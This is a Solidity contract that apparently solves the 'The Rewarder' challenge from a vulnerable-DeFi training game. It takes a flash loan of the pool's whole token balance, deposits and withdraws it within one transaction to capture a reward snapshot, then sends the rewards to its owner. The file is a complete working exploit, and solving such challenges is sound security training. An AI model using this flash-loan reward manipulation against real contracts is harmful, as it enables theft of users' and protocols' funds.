pragma solidity ^0.8.0;

import "../the-rewarder/RewardToken.sol";
import "../the-rewarder/AccountingToken.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract RewarderExploiter {
    RewardToken rewardToken;
    TheRewarderPool rewarderPool;
    FlashLoanerPool flashLoanerPool;
    ERC20 damnValuableToken;
    address owner;

    constructor(
        RewardToken _rewardToken,
        TheRewarderPool _rewarderPool,
        FlashLoanerPool _flashLoanerPool,
        ERC20 _damnValuableToken
    ) {
        owner = msg.sender;
        rewarderPool = _rewarderPool;
        rewardToken = _rewardToken;
        flashLoanerPool = _flashLoanerPool;
        damnValuableToken = _damnValuableToken;
    }

    function exploit() public {
        uint256 flashLoanPoolBalance = damnValuableToken.balanceOf(
            address(flashLoanerPool)
        );
        flashLoanerPool.flashLoan(flashLoanPoolBalance);
    }

    function receiveFlashLoan(uint256 amount) external {
        damnValuableToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        damnValuableToken.transfer(address(flashLoanerPool), amount);
        uint256 rewards = rewardToken.balanceOf(address(this));
        rewardToken.transfer(owner, rewards);
    }
}
